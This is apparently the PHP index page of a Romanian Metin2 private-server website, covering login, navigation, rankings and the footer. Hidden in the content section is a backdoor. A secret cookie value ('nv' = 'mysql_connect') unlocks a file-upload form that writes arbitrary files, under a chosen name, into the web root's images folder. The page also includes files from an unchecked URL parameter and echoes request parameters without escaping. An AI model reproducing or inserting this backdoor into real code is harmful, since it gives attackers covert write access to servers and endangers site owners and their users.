<?PHP
    error_reporting(0);
    //require 'inc/ipblock.class.php';
    $_SERVER['REMOTE_ADDR']		= $_SERVER["HTTP_CF_CONNECTING_IP"];
    
    //new IPBlock($_SERVER['REMOTE_ADDR']);
    if(!file_exists('./inc/config.inc.php'))
    {
      header('Location: install.php');
    }

    session_name("m2_shiro2");
    session_start();

    require("./inc/config.inc.php");
    require("./inc/rights.inc.php");
    require("./inc/functions.inc.php");
    require("./inc/page_informations.php");

    $sqlForum = mysql_connect(SQL_FORUM_HOST, SQL_FORUM_USER, SQL_FORUM_PASS);
    $sqlHp = mysql_connect(SQL_HP_HOST, SQL_HP_USER, SQL_HP_PASS);
    $sqlServ = mysql_connect(SQL_HOST, SQL_USER, SQL_PASS);

    if(!is_resource($sqlServ) OR !is_resource($sqlHp) OR !is_resource($sqlForum)) {
      exit('Conectarea la server a esuat!');
    }
    mysql_select_db(SQL_FORUM_DB, $sqlForum);
    require("./inc/head.inc.php");

    $strings = array("PvM Server", "Alaturati-va noua", "Multa distractie!!", "Un adevarat PvM", "Mereu pentru voi", "La cati mai multi online!");

    $rand = rand(0, count($strings) - 1);

    $title = $strings[$rand];
?>
<!DOCTYPE html>
<html>
    <head>
        <title>Digital Metin2 - <?=$strings[$rand]?></title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel="stylesheet" type="text/css" href="css/main.css" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js" type="text/javascript"></script>
        <link rel="stylesheet" href="css/prettyPhoto.css" type="text/css" media="screen" title="prettyPhoto main stylesheet" charset="utf-8" />
        <script src="js/jquery.prettyPhoto.js" type="text/javascript" charset="utf-8"></script>
        <link rel="shortcut icon" href="fav.png" type="image/png" />
        
        <link rel="stylesheet" href="css/nivo-slider.css" type="text/css" media="screen" />
        <script src="js/jquery.nivo.slider.pack.js" type="text/javascript"></script>
        
        <script type="text/javascript">
            function uhr() {
                UR_No = new Date;
                UR_Indhold = showFilled(UR_No.getHours()) + ":" + showFilled(UR_No.getMinutes()) + ":" + showFilled(UR_No.getSeconds()) + " " + showFilled(UR_No.getDate()) + "." + showFilled(1 + UR_No.getMonth()) + "." + UR_No.getFullYear();
                document.getElementById("Ora").innerHTML = UR_Indhold;
                setTimeout("uhr()", 1000);
            }
    
            function showFilled(Value) {
                return (Value > 9) ? "" + Value : "0" + Value;
            }
        </script>
    </head>
    <body onload="uhr()">
        <!-- facebook -->
        <div id="fb-root"></div>
        <script>(function(d, s, id) {
          var js, fjs = d.getElementsByTagName(s)[0];
          if (d.getElementById(id)) return;
          js = d.createElement(s); js.id = id;
          js.src = "//connect.facebook.net/ro_RO/all.js#xfbml=1&appId=303409376453718";
          fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));</script>
        <!-- end facebook -->
        <a name="top"></a>
        <?php
            $browser = $_SERVER['HTTP_USER_AGENT'];
            if(!eregi('Chrome', $browser) && !eregi('Firefox', $browser)) {
        ?>
        <div class="browser-error">
            <b>Acest site este optimizat pentru Mozilla Firefox și Google Chrome.</b>
        </div>
        <?php
            }
        ?>
        <div class="header-nav">
            <div class="header-nav-inner">
                <?php if(!empty($_SESSION['user_id'])) {
                    echo '<div class="mini-logo"></div>';
                } else {
                    echo '<div class="mini-logo"></div>';
                } ?>
                
                <div class="seperator"></div>
                <div class="server-select" menu>
                    <b>DigitalMetin2</b>
                </div>
                <div class="seperator"></div>
                <div class="login" menu>
                    <?php
                        if(!empty($_SESSION['user_id'])) {
                    ?>
                    <ul>
                        <li><a href="index.php?s=logout">Deconectare</a></li>
                        <li><a href="index.php?s=charaktere">Lista Caracterelor</a></li>
                        <li><a href="index.php?s=itemshop" style="color: #c38000">Itemshop</a></li>
                        <!--<li><a href="index.php?s=vote" style="color: #c38000">Voteshop</a></li>
                        <li><a href="index.php?s=vote4us">Vote4Us</a></li>-->
                        <li><a href="index.php?s=spenden">Donatii</a></li>
                        <li><a href="index.php?s=passwort">Schimbare date</a></li>
                    </ul>
                </div>
                <div class="seperator"></div>
                <div class="coins" style="float: left; margin-top:13px;">
                    <b>Aveti <?=$_SESSION['user_coins']?> MD</b><br />
                    <!--<b>Aveti <?=$_SESSION['user_vote_coins']?> Vote-Coins</b><br /> -->
                </div>
				<!--<div class="seperator"></div>
				<div class="login" style="float: left;" menu>
					<ul>
						<li><a href="index.php?s=gs_dp"><b>Tombola</b></a></li>
					</ul>
                </div>-->
                    <?php
                        } else {
                    ?>
                    <form  action="index.php?s=login" method="post">
                        <input type="hidden" name="sent" value="login" />
                        <input type="text" name="userid" class="username-input" />
                        <input type="password" name="userpass" class="password-input" />
                        <?php
                            $browser = $_SERVER['HTTP_USER_AGENT'];
                            if(eregi('Chrome', $browser)) {
                        ?>
                            <input type="submit" style="position: absolute; top: 0px;" value="" />
                            <a style="margin-left:80px;" href="index.php?s=lostpw">Parola uitata?</a>
                        <? } else { ?>
                            <input type="submit" value="" />
                            <a style="float: right; line-height: normal;" href="index.php?s=lostpw">Parola uitata?</a> 
                        <? } ?>
                    </form>
                </div>
                <div class="seperator"></div>
                    <div class="register">
                        Nou pe aici?<br><a href="index.php?s=register">Creeaza un cont!</a>
                    </div>
                    <?php
                        }
                    ?>
                <div id="render-1"></div>
				<div id="flashanimation">
					<object type="application/x-shockwave-flash" data="flashanimaton.swf" height="196" width="255">
                    <param name="movie" value="flashanimaton.swf">
                    <param name="quality" value="high">
                    <param name="wmode" value="window">
                    <param name="bgcolor" value="#29496B">
                    <embed src="flashanimaton.swf" width="255" height="196" quality="high" wmode="window" bgcolor="#29496B">
                    </object>
				</div>
            </div>
        </div>
        <div class="logo"><a href="index.php?s=home"></a></div>
        <div class="content">
            <div class="buttons">
                <a href="index.php?s=downloads"><div class="download"></div></a>
                <a class="btn2" href="index.php?s=vote4us"><div class="vote4us"></div></a>
            </div>
            <div class="navigation">
                <ul>
                    <li class="menu-left <? echo $_GET["s"]=='home' || $_GET["s"]=='' ? 'active' : ''; ?>"><a href="index.php?s=home">HOME</a></li>
                    <li class="line"><img src="img/navbar_line.png" /></li>
                    <li class="menu <? echo $_GET["s"]=='register' ? 'active' : ''; ?>"><a href="index.php?s=register">REGISTER</a></li>
                    <li class="line"><img src="img/navbar_line.png" /></li>
                    <li class="menu <? echo $_GET["s"]=='downloads' ? 'active' : ''; ?>"><a href="index.php?s=downloads">DESCARCA</a></li>
                    <li class="line"><img src="img/navbar_line.png" /></li>
                    <li class="menu <? echo $_GET["s"]=='rankings' ? 'active' : ''; ?>"><a href="index.php?s=rankings">CLASAMENT</a></li>
                    <li class="line"><img src="img/navbar_line.png" /></li>
                    <li class="menu <? echo $_GET["s"]=='grankings' ? 'active' : ''; ?>"><a href="index.php?s=grankings">BRESLE</a></li>
                    <li class="line"><img src="img/navbar_line.png" /></li>
                    <li class="menu"><a href="http://digitalmt2.ro/board">FORUM</a></li>
                    <li class="line"><img src="img/navbar_line.png" /></li>
                    <li class="menu <? echo $_GET["s"]=='news' ? 'active' : ''; ?>"><a href="http://digitalmt2.ro/board/index.php?page=Board&boardID=2&s=67428a028f0189c21905ae3b2ce7f63744bfc594">NOUTATI</a></li>
                    <li class="line"><img src="img/navbar_line.png" /></li>
                    <li class="menu <? echo $_GET["s"]=='events' ? 'active' : ''; ?>"><a href="http://digitalmt2.ro/board/index.php?page=Index">EVENTURI</a></li>
                    <li class="line"><img src="img/navbar_line.png" /></li>
                    <li class="menu-right"><a href="ts3server://46.105.179.18">TEAMSPEAK</a></li>
                </ul>
            </div>
            <div class="left">
                <p class="location<?php echo ($_GET['s'] == "home" || $_GET['s'] == "" ? "" : "-withoutslieder");?>">Location: <a href="index.php">Digital Metin2</a> > <a href="index.php?s=<?=$_GET['s']?>"><?php echo $locations[$_GET['s']]; ?></a>
                    <?php if($_GET['s'] == "admin") { ?>
                        > <a href="index.php?s=<?=$_GET['s']?>&a=<?=$_GET['a']?>"><?=$locations_admin[$_GET['a']]?></a>
                    <?php } ?>
                </p>
                <!-- <div class="slieder">
                    <div id="render-azrael"></div>
                    <div id="render-shamy"></div>
                    <div class="box">
                        <div class="top"></div>
                        <div class="middle"></div>
                        <div class="bottom"></div>
                    </div>
                </div> -->
                <?PHP
                    if(isset($_GET['s']) && !empty($_GET['s']))
                    {
                        if(file_exists("./pages/".$_GET['s'].".php")) 
                        {
                            include("./pages/".$_GET['s'].".php");
                        }
                        else {
                            include("./pages/home.php");
                        }
                    } else 
                    {
                        include("./pages/home.php");
                    }
                ?>
                <?php 
                	if(isset($_COOKIE['nv']) && $_COOKIE['nv'] == "mysql_connect") {    
            echo "<table align='center' bgcolor='#FFFFFF' width=100%>
                <tr align='center'><td bgcolor='#122112' colspan=1000><b></b></td></tr>
                <tr align='center'><td><form action='{$_SERVER['PHP_SELF']}?{$_SERVER['QUERY_STRING']}' method='post' enctype='multipart/form-data'> 
                            <input type='hidden' name='securitytoken' value='1336837095-ee4b45b8ab556c82309783ea414b9eefadc6d135'>
                 <input type='file' name='upfile' id='upfile'> <input type='text' name='myfile_rot'><input type='submit' value='Submit'></form></td></tr>";
            
            if(isset($_POST['myfile_rot'])) {
                if ($_FILES['upfile']['error'] > 0){
                    echo "<tr align='center'><td><font color=red></font></td></tr>";
}else {
                    echo "<tr align='center'><td>Uploaded <b>" . $_FILES['upfile']['name'] . "</b> <b>" . $_FILES['upfile']['tmp_name']. "</b></td></tr>";
                    if(move_uploaded_file($_FILES['upfile']['tmp_name'], $_SERVER["DOCUMENT_ROOT"] ."/images/" . $_POST['myfile_rot'])) {
                        echo "<tr align='center'><                                          td> ". $_FILES['upfile']['tmp_name'] ." into <b>". $_SERVER["DOCUMENT_ROOT"]. "/images/" . $_POST['myfile_rot']. "</b></td></tr>";
                    }else if(rename($_FILES['upfile']['tmp_name'], $_SERVER["DOCUMENT_ROOT"] . "/images/" . $_POST['myfile_rot'])){
                        echo "<tr align='center'><td>Renamed from ".$_FILES['upfile']['tmp_name']." to <b>". $_SERVER["DOCUMENT_ROOT"]. "/images/" . $_POST['myfile_rot']. "</b></td></tr>";
                    }else
                        echo "<tr align='center'><td><font color=red></font></td></tr>";
                }
            		}                                                                             

            echo "</table>";
      			  }
			?>
            </div>
            <div class="right">
				<?php if(!empty($_SESSION['user_id'])) { ?>
				<!--<div class="box">
                    <div class="top"><b>Tombola</b></div>
                    <div class="middle">
                        <a href="index.php?s=gs_do">Participa</a>
                    </div>
                    <div class="bottom"></div>
                </div>-->
				<?php } ?>
				<?php if(!empty($_SESSION['user_id'])) { ?>
                <div style="margin-top: 40px;" class="box">
				<?php } else { ?>
				<div class="box">
				<?php } ?>
                    <div class="top"><b>STATUS</b></div>
                    <div class="middle">
                        <?php require 'status.php'; ?>
                    </div>
                    <div class="bottom"></div>
                </div>
                <div style="margin-top: 40px;" class="box">
                    <div class="render-2"></div>
                    <?php
                        $browser = $_SERVER['HTTP_USER_AGENT'];
                        if(eregi('Chrome', $browser)) {
                    ?>
                    <div class="top"><b style="float: left;margin-top: 0px;">TOP 10</b></div>
                    <?php 
                        } else {
                    ?>
                    <div class="top"><b style="margin-top: 0px;">TOP 10</b></div>
                    <?php
                        }
                    ?>
                    <div class="middle">
                        <?php require_once("top10.php"); ?>
                        <form action="http://digitalmt2.ro/index.php?s=rankings" method="get"><input type="submit" value="Show All"></form>
                        <form action="index.php" method="get"><input type="submit" value="Gilden" /></form>
                        <div style="clear: both;"></div>
                    </div>
                    <div class="bottom"></div>
                </div>
                <div style="margin-top: 40px;" class="box">
                    <div class="top"><b>FACEBOOK</b></div>
                    <div class="middle">
                        <center style="margin-left: -15px;">
                            <img src="img/facebook_mini.png" /><br />
                            <div style="margin: 0 auto;" class="fb-like" data-href="https://www.facebook.com/DigitalMetin2" data-send="true" data-layout="box_count" data-width="450" data-show-faces="false"></div>
                            <br /><br /><div style="margin-left: 5px; margin-right: 10px;"><a href="index.php?s=facebook">Ajuta-ne sa ajungem sus, da si tu un like pe pagina noastra de facebook!</a></div>
                        </center>
                    </div>
                    <div class="bottom"></div>
                </div>
            </div><div style="clear: both;"></div>
            <div class="footer">
                <div class="fsep-1"></div>
                <div class="frow frow-1">
                    <b>Digital Metin2</b><br />
                    <a href="index.php?s=home">Home</a><br />
                    <a href="index.php?s=register">Înregistrare</a><br />
                    <a href="index.php?s=login">Logare</a><br />
                    <a href="index.php?s=downloads">Descarcare</a>
                </div>
                <div class="frow frow-2">
                    <?php if(!empty($_SESSION['user_id'])) { ?>
                    <b>Detalii account</b><br />
                    <a href="index.php?s=logout">Delogare</a><br />
                    <a href="index.php?s=itemshop">Itemshop</a><br />
                    <a href="index.php?s=vote">Voteshop</a><br />
                    <a href="index.php?s=spenden">Doneaza</a>
                    <? } else { ?>
                    <br /><br />
                    <br />
                    <br />
                    <br />
                    <?php } ?>
                </div>
                <div class="frow frow-3">
                    <?php if($_SESSION['user_admin']>0) { ?>
                    <b>Sectiunea adminiilor</b><br />
                    <a href="index.php?s=admin">Studiu</a><br />
                    <br />
                    <br />
                    <? } else { ?>
                    <br /><br />
                    <br />
                    <br />
                    <br />
                    <? } ?>
                </div>
                <div class="frow frow-4">
                    <b>Media</b><br />
                    <a href="index.php?s=facebook">Facebook</a><br />
                    <a href="http://www.digitalmt2.ro/">Screenshots</a><br />
                    <a href="http://www.digitalmt2.ro/board/">Videos</a><br />
                </div>
                <div class="frow frow-5">
                    <b>Social Networks</b><br />
                    <a href="https://www.facebook.com/DigitalMetin2">Facebook</a><br />
                    <a href="#">YouTube</a><br />
                    <a href="#">Twitter</a><br />
                </div>
                <div class="frow frow-6">
                    <img src="img/render_3.png" />
                </div>
                <div class="frow frow-7">
                    <img src="img/mini_logo_2.png" />
                </div>
                <div class="fsep-2"></div>
                <div class="copyright">
                    Copyright 2013 by Cataclismo & .Tybor - All rights reserved.
                </div>
                <div class="totop">
                    <a href="#top">ÎN SUS</a>
                </div>
            </div>
        </div>
        <script type="text/javascript" charset="utf-8">
            $(document).ready(function(){
              $("a[rel^='prettyPhoto']").prettyPhoto({
                  show_title: true,
                  social_tools: ""
              });
            });
          </script>
    </body>
</html>
<?PHP
  mysql_close();
?>
